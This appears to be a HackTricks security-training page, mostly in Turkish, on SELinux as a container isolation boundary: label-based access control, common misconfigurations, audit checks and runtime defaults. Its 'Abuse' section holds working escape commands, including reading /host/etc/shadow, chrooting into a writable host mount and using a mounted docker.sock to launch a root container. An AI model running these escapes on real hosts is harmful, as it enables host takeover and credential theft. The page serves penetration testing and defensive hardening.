# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

SELinux, **etiket-tabanlı Zorunlu Erişim Kontrolü** sistemidir. İlgili her süreç ve nesne bir güvenlik bağlamı (security context) taşıyabilir ve politika hangi domain'lerin hangi type'larla ve nasıl etkileşime girebileceğine karar verir. Konteynerleştirilmiş ortamlarda bu genellikle runtime'ın konteyner sürecini sınırlandırılmış bir container domain altında başlatması ve konteyner içeriğini karşılık gelen type'larla etiketlemesi anlamına gelir. Politika doğru çalışıyorsa, süreç etiketinin dokunması beklenen öğeleri okuyup yazabilirken, bu içerik bir mount aracılığıyla görünür hale gelse bile diğer host içeriğine erişimi reddedilecektir.

Bu, yaygın Linux konteyner dağıtımlarında mevcut en güçlü host-tarafı korumalardan biridir. Fedora, RHEL, CentOS Stream, OpenShift ve diğer SELinux-merkezli ekosistemlerde özellikle önemlidir. Bu ortamlarda SELinux'u göz ardı eden bir inceleyici, host'un ele geçirilmesine giden bariz görünen bir yolun neden aslında engellendiğini sıklıkla yanlış anlayacaktır.

## AppArmor ve SELinux

En basit yüksek seviyeli fark, AppArmor'ın yol-tabanlı (path-based) iken SELinux'un **etiket-tabanlı (label-based)** olmasıdır. Bu, konteyner güvenliği açısından büyük sonuçlar doğurur. Yol-tabanlı bir politika, aynı host içeriği beklenmedik bir mount yolu altında görünür hale gelirse farklı davranabilir. Etiket-tabanlı bir politika ise nesnenin etiketinin ne olduğunu ve süreç domain'inin ona karşı neler yapabileceğini belirler. Bu, SELinux'u basit yapmaz ama AppArmor-tabanlı sistemlerde savunucuların bazen kazara yaptığı yol-trik varsayımlarına karşı dayanıklı kılar.

Model etiket-odaklı olduğundan, container volume yönetimi ve yeniden etiketleme kararları güvenlik açısından kritik öneme sahiptir. Eğer runtime veya operatör, mount'ların "çalışmasını sağlamak" için etiketleri çok geniş şekilde değiştirirse, iş yükünü içermesi gereken politika sınırı amaçlandığından çok daha zayıf hale gelebilir.

## Lab

SELinux'un host üzerinde etkin olup olmadığını görmek için:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Host üzerindeki mevcut etiketleri incelemek için:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Etiketlemenin devre dışı bırakıldığı bir çalışma ile normal bir çalışmayı karşılaştırmak için:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a workload running under the expected container domain and one that has been stripped of that enforcement layer.

## Runtime Usage

Podman is particularly well aligned with SELinux on systems where SELinux is part of the platform default. Rootless Podman plus SELinux is one of the strongest mainstream container baselines because the process is already unprivileged on the host side and is still confined by MAC policy. Docker can also use SELinux where supported, although administrators sometimes disable it to work around volume-labeling friction. CRI-O and OpenShift rely heavily on SELinux as part of their container isolation story. Kubernetes can expose SELinux-related settings too, but their value obviously depends on whether the node OS actually supports and enforces SELinux.

The recurring lesson is that SELinux is not an optional garnish. In the ecosystems that are built around it, it is part of the expected security boundary.

## Misconfigurations

The classic mistake is `label=disable`. Operationally, this often happens because a volume mount was denied and the quickest short-term answer was to remove SELinux from the equation instead of fixing the labeling model. Another common mistake is incorrect relabeling of host content. Broad relabel operations may make the application work, but they can also expand what the container is allowed to touch far beyond what was originally intended.

It is also important not to confuse **installed** SELinux with **effective** SELinux. A host may support SELinux and still be in permissive mode, or the runtime may not be launching the workload under the expected domain. In those cases the protection is much weaker than the documentation might suggest.

## Abuse

When SELinux is absent, permissive, or broadly disabled for the workload, host-mounted paths become much easier to abuse. The same bind mount that would otherwise have been constrained by labels may become a direct avenue to host data or host modification. This is especially relevant when combined with writable volume mounts, container runtime directories, or operational shortcuts that exposed sensitive host paths for convenience.

SELinux often explains why a generic breakout writeup works immediately on one host but fails repeatedly on another even though the runtime flags look similar. The missing ingredient is frequently not a namespace or a capability at all, but a label boundary that stayed intact.

The fastest practical check is to compare the active context and then probe mounted host paths or runtime directories that would normally be label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Bir host bind mount mevcutsa ve SELinux labeling devre dışı bırakıldıysa veya zayıflatıldıysa, genellikle önce bilgi ifşası meydana gelir:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Eğer mount yazılabilirse ve kernel açısından container fiilen host-root ise, sonraki adım tahmin etmek yerine kontrollü host değişikliğini test etmektir:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux destekli hostlarda, çalışma zamanı durum dizinleri etrafındaki etiketlerin kaybı doğrudan privilege-escalation yollarını açığa çıkarabilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Bu komutlar tam bir escape chain'in yerini tutmaz, ancak SELinux'un host verilerine erişimi veya host tarafı dosya değişikliğini engelleyip engellemediğini çok hızlı şekilde ortaya koyar.

### Tam Örnek: SELinux Devre Dışı + Yazılabilir Host Mount

Eğer SELinux labeling devre dışı bırakılmış ve host filesystem `/host` üzerinde yazılabilir şekilde mount edilmişse, tam bir host escape normal bir bind-mount abuse vakasına dönüşür:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Eğer `chroot` başarılı olursa, container process artık host filesystem üzerinden çalışıyor:
```bash
id
hostname
cat /etc/passwd | tail
```
### Tam Örnek: SELinux Devre Dışı + Çalışma Zamanı Dizini

Eğer iş yükü, etiketler devre dışı bırakıldıktan sonra bir çalışma zamanı soketine erişebiliyorsa, kaçış çalışma zamanına devredilebilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
İlgili gözlem, SELinux'un sıklıkla tam olarak bu tür host-path veya runtime-state erişimini engelleyen kontrol olduğudur.

## Checks

SELinux kontrollerinin amacı, SELinux'un etkin olduğunu doğrulamak, geçerli güvenlik bağlamını belirlemek ve ilgilendiğiniz dosyaların veya yolların gerçekten etiketle sınırlandırılıp sınırlandırılmadığını kontrol etmektir.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Burada dikkat çekici olanlar:

- `getenforce` ideal olarak `Enforcing` döndürmelidir; `Permissive` veya `Disabled` tüm SELinux bölümünün anlamını değiştirir.
- Mevcut process context beklenmedik veya çok geniş görünüyorsa, workload muhtemelen hedeflenen container policy altında çalışmıyor olabilir.
- Host-mounted dosyalar veya runtime dizinleri süreç tarafından çok serbestçe erişilebilen labels'e sahipse, bind mounts çok daha tehlikeli hale gelir.

SELinux özellikli bir platformda bir container'ı incelerken, labeling'i ikincil bir ayrıntı olarak ele almayın. Birçok durumda bu, host'un henüz kompromize olmamasının ana nedenlerinden biridir.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host'a bağlı | SELinux ayrımı SELinux etkin host'larda mevcut, ancak tam davranış host/daemon yapılandırmasına bağlıdır | `--security-opt label=disable`, bind mounts'ların geniş yeniden etiketlenmesi, `--privileged` |
| Podman | SELinux host'larında genellikle etkin | SELinux ayrımı, devre dışı bırakılmadığı sürece SELinux sistemlerinde Podman'ın normal bir parçasıdır | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Genellikle Pod seviyesinde otomatik atanmaz | SELinux desteği vardır, ancak Pod'lar genellikle `securityContext.seLinuxOptions` veya platforma özel varsayılanlara ihtiyaç duyar; runtime ve node desteği gereklidir | zayıf veya geniş `seLinuxOptions`, permissive/disabled node'larda çalışma, labeling'i devre dışı bırakan platform politikaları |
| CRI-O / OpenShift style deployments | Genellikle yoğun şekilde kullanılır | Bu ortamlarda SELinux genellikle node izolasyon modelinin temel bir parçasıdır | erişimi aşırı genişleten özel politikalar, uyumluluk için labeling'in devre dışı bırakılması |

SELinux varsayılanları, seccomp varsayılanlarından daha çok dağıtıma bağlıdır. Fedora/RHEL/OpenShift tarzı sistemlerde SELinux genellikle izolasyon modelinin merkezindedir. Non-SELinux sistemlerde ise basitçe yoktur.
{{#include ../../../../banners/hacktricks-training.md}}
